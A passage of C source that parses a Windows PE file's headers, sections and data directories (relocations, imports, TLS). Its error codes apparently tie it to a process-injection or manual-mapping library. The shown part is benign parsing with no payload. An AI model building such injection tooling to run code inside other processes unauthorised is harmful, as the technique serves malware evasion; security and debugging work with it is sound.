    }
    
    pe_info->file_buffer = buffer;
    pe_info->file_size = size;
    
    // Parse DOS header
    pe_info->dos_header = (PIMAGE_DOS_HEADER)buffer;
    if (pe_info->dos_header->e_magic != IMAGE_DOS_SIGNATURE) {
        return INJECT_ERROR_INVALID_PARAMS;
    }
    
    // Parse NT headers
    pe_info->nt_headers = (PIMAGE_NT_HEADERS)((BYTE*)buffer + pe_info->dos_header->e_lfanew);
    if (pe_info->nt_headers->Signature != IMAGE_NT_SIGNATURE) {
        return INJECT_ERROR_INVALID_PARAMS;
    }
    
    // Get sections
    pe_info->sections = IMAGE_FIRST_SECTION(pe_info->nt_headers);
    pe_info->section_count = pe_info->nt_headers->FileHeader.NumberOfSections;
    
    // Get image info
    pe_info->image_size = pe_info->nt_headers->OptionalHeader.SizeOfImage;
    pe_info->entry_point = pe_info->nt_headers->OptionalHeader.AddressOfEntryPoint;
    pe_info->image_base = pe_info->nt_headers->OptionalHeader.ImageBase;
    
    // Check characteristics
    pe_info->is_dll = (pe_info->nt_headers->FileHeader.Characteristics & IMAGE_FILE_DLL) != 0;
    
    // Check for relocations
    IMAGE_DATA_DIRECTORY* reloc_dir = &pe_info->nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    pe_info->has_relocations = (reloc_dir->Size > 0);
    
    // Check for imports
    IMAGE_DATA_DIRECTORY* import_dir = &pe_info->nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    pe_info->has_imports = (import_dir->Size > 0);
    
    // Check for TLS
    IMAGE_DATA_DIRECTORY* tls_dir = &pe_info->nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    pe_info->has_tls = (tls_dir->Size > 0);
    
    return INJECT_SUCCESS;
}

#endif // PLATFORM_WINDOWS